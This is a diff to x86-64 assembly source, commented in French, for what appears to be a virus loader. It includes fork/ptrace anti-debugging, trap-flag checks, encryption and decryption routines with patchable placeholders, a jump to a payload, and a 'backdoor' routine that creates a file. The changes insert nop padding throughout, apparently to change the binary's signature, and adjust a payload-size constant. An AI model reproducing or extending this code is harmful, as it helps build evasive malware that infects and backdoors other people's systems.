@@ -17,6 +17,12 @@ fork_check:
 	mov rax, 0x39
 	syscall	;fork
 	mov r14, rax
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	cmp rax, 0
 	je child_check
 	jl end_ft_end
@@ -26,6 +32,12 @@ fork_check:
 	add rsp, 0x20
 	and rax, 0xff00
 	shr rax, 8
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	cmp rax, 1	;check if ok with WEXITSTATUS
 	je end_ft_end
 
@@ -34,6 +46,12 @@ fork_hash:
 	mov rax, 0x39
 	syscall	;fork
 	mov r14, rax
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	cmp rax, 0
 	je child_hash
 	jl end_ft_end
@@ -61,6 +79,12 @@ hash:
 	;    mov r13d, edi ;hash bis
 	mov rdx, 0x44d ;size payload + bis_size a modifier 0x1f4f
 	mov rsi, 0 ;inc
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	lea rcx, [syscalls] ;adresse syscalls
 hash_loop1:
 	cmp rsi,0x107;|REPLACE3| offset key a eviter
@@ -96,6 +120,12 @@ chiffrement:
 	add r15d, r13d
 	mov r9, 8 ; NB_TIMING MOODULABLE ; chiffrement
 	mov r14, 0x95837523 ; SUB ; chiffrement
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	pushfq ; verif step by step
 	pop r12
 	mov r13, 1 ; mark this zone as loader ; chiffrement
@@ -143,9 +173,15 @@ label_jmp_to_payload:
 	jmp r15 ; addresse du payload ; jmp_to_payload
 ft_end:
 	mov r9, 8 ; NB_TIMING MOODULABLE ; dechiffrement
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	mov r13, 2 ; mark this zone as end ; dechiffrement
 dechiffrement_loop2:
-	mov eax, 0x45e9;|REPLACE2| taille du 0x1847d ; dechiffrement & chiffrement
+	mov eax, 0x45cf;|REPLACE2| taille du 0x1847d ; dechiffrement & chiffrement
 	shr eax, 2 ; dechiffrement & chiffrement
 	jmp after_exit_3
 	jmp after_exit_4
@@ -187,12 +223,24 @@ end_ft_end:
 	pop r14 ; pop
 	pop r13 ; pop
 	pop r12 ; pop
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	pop r11 ; pop
 	pop r10 ; pop
 	pop r9 ; pop
 	pop r8 ; pop
 	pop rdx ; pop
 	pop rcx ; pop
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	pop rbx ; pop
 	pop rax ; pop
 	pop rsi ; pop
@@ -224,6 +272,12 @@ wait4_for_parent:
 	mov rdi, r14
 	lea rsi, [rbp - 0x20]
 	mov rdx, 0x2
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	mov r10, 0
 	mov rax, 0x3d
 	syscall
@@ -236,6 +290,12 @@ wait4_for_child:
 	mov r10, 0
 	mov rax, 0x3d
 	syscall
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	ret
 
 ptrace:
@@ -306,6 +366,12 @@ backdoor:
 
 	lea rdi, [write_path2]
 	mov rsi, 0x41
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	mov rdx, 666o
 	mov rax, 0x2
 	syscall
@@ -356,6 +422,12 @@ child_hash:
 	mov rdi, 0x10
 	mov r10, 0
 	call ptrace ; PTRACE_ATTACH
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	cmp rax, 0
 	jl exit_1
 	call wait4_for_child
@@ -386,6 +458,12 @@ child_hash2:
 	mov rdi, 0x07
 	mov r10, 0
 	call ptrace ; PTRACE_CONT
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	call wait4_for_child ; wait end parent after exit
 	add rsp, 0x100
 	jmp exit_0
